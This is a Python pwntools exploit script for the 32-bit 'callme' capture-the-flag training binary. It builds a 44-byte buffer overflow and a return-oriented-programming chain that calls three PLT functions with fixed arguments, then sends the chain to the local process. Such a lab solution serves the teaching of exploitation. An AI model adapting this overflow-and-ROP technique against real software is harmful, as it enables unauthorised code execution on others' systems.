#!/usr/bin/env python2
from pwn import *

exe  = "./callme32"

elf  = ELF(exe)

one   = elf.plt['callme_one']
two   = elf.plt['callme_two']
three = elf.plt['callme_three']

setup_stack_pop_gadget = 0x080488a9 
usefulFunction = 0x08048842

proc = process(exe)

log.info("One  : " + hex(one))
log.info("Two  : " + hex(two))
log.info("Three: " + hex(three))
log.info("Useful Function: " + hex(usefulFunction))

payload =  ""
payload += "d"*44
payload += p32(one)
payload += p32(setup_stack_pop_gadget)
payload += p32(1)
payload += p32(2)
payload += p32(3)
payload += p32(two)
payload += p32(setup_stack_pop_gadget)
payload += p32(1)
payload += p32(2)
payload += p32(3)
payload += p32(three)
payload += p32(setup_stack_pop_gadget)
payload += p32(1)
payload += p32(2)
payload += p32(3)

log.info("Payload Generated.")
log.info("Payload: " + payload)
with open('payload', 'wb') as f:
    f.write(payload)


proc.recv()
proc.sendline(payload)

print "RECEIVED: "
print proc.recv()
print "DONE"
